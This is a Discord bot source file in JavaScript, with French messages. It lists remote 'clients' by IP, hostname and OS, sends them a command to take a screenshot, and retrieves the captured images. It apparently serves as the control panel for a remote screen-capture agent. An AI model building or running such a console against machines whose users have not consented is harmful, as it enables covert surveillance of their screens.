import {
    ActionRowBuilder,
    AttachmentBuilder,
    ButtonBuilder,
    Client,
    EmbedBuilder,
    GatewayIntentBits,
    StringSelectMenuBuilder
} from 'discord.js';
import config from './config.json' assert {type: 'json'};
import axios from "axios";
import {commands} from './commands.js';

const { TOKEN, API_BASE_URL, API_TOKEN } = config;
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

let tokenData = { token: '', expires: Date.now() };

async function executeRequestWithTokenRefresh(url, options = { method: 'GET', data: null }) {
    const tryRequest = async () => {
        if (options.data) {
            return axios({ url, method: options.method, data: options.data, headers: { 'Authorization': `Bearer ${tokenData.token}` } });
        } else {
            return axios({ url, method: options.method, headers: { 'Authorization': `Bearer ${tokenData.token}` } });
        }
    };

    try {
        return await tryRequest();
    } catch (error) {
        if (error.response && error.response.status === 401) {
            await refreshTokenIfNeeded(true);
            return await tryRequest();
        } else {
            throw error;
        }
    }
}

async function refreshTokenIfNeeded(forceRefresh = false) {
    if (forceRefresh || Date.now() >= tokenData.expires) {
        try {
            const response = await axios.post(`${API_BASE_URL}/auth`, {
                secret_key: API_TOKEN,
            });
            tokenData.token = response.data.access_token;
            tokenData.expires = Date.now() + (24 * 60 * 60 * 1000);
            console.log("Token récupéré avec succès !")
        } catch (error) {
            console.error("Erreur lors de la récupération du token", error);
        }
    }
}

client.on('ready', async () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    client.user.setActivity('/help');
    await refreshTokenIfNeeded();
});

const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    const embed = new EmbedBuilder()
        .setTitle('Help')
        .setDescription('Voici la liste des commandes disponibles :')
        .addFields(commands.map(command => ({
            name: `/${command.name}`,
            value: command.description,
        })))
        .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
};

const handleScreenshotCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ ephemeral: true });
    const url = `${API_BASE_URL}/command/${clientId}`;
    try {
        await executeRequestWithTokenRefresh(url, { method: 'POST', data: { command: 'screenshot' } });
        await interaction.editReply(`${commands.find(command => command.name === 'screenshot').description}`);
    } catch (error) {
        console.error("Erreur lors de l'envoi de la commande", error);
        await interaction.editReply("Erreur lors de l'envoi de la commande.");
    }
}


const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await executeRequestWithTokenRefresh(url);
        const clients = response.data.clients;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const embeds = clients.map(client => new EmbedBuilder()
            .setTitle(`Client ${client.name || 'Client sans nom'} / ${client.ip}`)
            .setDescription(
                `**OS :** ${client.os}\n` +
                `**Version :** ${client.version}\n` +
                `**Hostname :** ${client.hostname}\n` +
                `**Créé le :** ${client.date_created}\n` +
                `**Mis à jour le :** ${client.date_updated}\n` +
                `**Statut :** ${client.status.toUpperCase()}`
            )
            .setColor(client.status === 'online' ? '#00FF00' : '#FF0000')
            .setTimestamp());

        await interaction.editReply({ embeds });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

const handleStopCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    await interaction.editReply('Arrêt du bot...');
    process.exit(0);
};

const handleListAllScreenshotsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    try {
        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients`);
        const clients = response.data.clients;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const buttons = clients.map(client =>
            new ButtonBuilder()
                .setCustomId(`client_${client.id}`)
                .setLabel(`${client.name || 'Client sans nom'} / ${client.ip}`)
                .setStyle(1)
        );

        const components = [];
        for (let i = 0; i < buttons.length; i += 5) {
            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
            components.push(actionRow);
        }

        await interaction.editReply({ content: "Sélectionnez un client pour voir les captures d'écran :", components });
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'screenshot':
                await handleScreenshotCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
            case 'stop':
                await handleStopCommand(interaction);
                break;
            case 'listallscreenshots':
                await handleListAllScreenshotsCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const clientId = interaction.customId.split('_')[1];
        try {
            const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/screenshot/client/${clientId}`);
            const screenshots = response.data.screenshots;
            if (screenshots.length === 0) {
                await interaction.update("Aucune capture d'écran disponible pour ce client.");
                return;
            }

            const options = screenshots.map(screenshot => ({
                label: `Capture d\'écran ${screenshot.id}`,
                description: `Le ${screenshot.date_created}`,
                value: screenshot.id.toString(),
            }));

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId("select_screenshot")
                .setPlaceholder("Selectionnez une capture d'écran")
                .addOptions(options.slice(0, 25)); // Discord limit of 25 options

            const row = new ActionRowBuilder().addComponents(selectMenu);

            await interaction.update({ content: "Selectionnez une capture d'écran :", components: [row] });
        } catch (error) {
            console.error("Erreur lors de la récupération des captures d'écran pour ce client", error);
            await interaction.update({ content: "Erreur lors de la récupération des captures d'écran pour ce client." });
        }
    } else if (interaction.customId === "select_screenshot") {
        const screenshotId = interaction.values[0];
        axios
            .get(`${API_BASE_URL}/screenshot/image/${screenshotId}`, {
                responseType: "arraybuffer",
            })
            .then((response) => {
                const imageBuffer = Buffer.from(response.data, "binary");
                const attachment = new AttachmentBuilder(imageBuffer, {
                    name: "screenshot.png",
                });

                const embed = new EmbedBuilder()
                    .setTitle("Capture d'écran")
                    .setDescription("Voici la capture d'écran :")
                    .setImage("attachment://screenshot.png");

                interaction.update({
                    content: "Voici la capture d'écran :",
                    files: [attachment],
                    embeds: [embed],
                    components: [],
                });
            })
            .catch((error) => {
                console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
                interaction.update({
                    content: "Erreur lors de la récupération de l'image de la capture d'écran.",
                    components: [],
                });
            });
    }

});

client.login(TOKEN);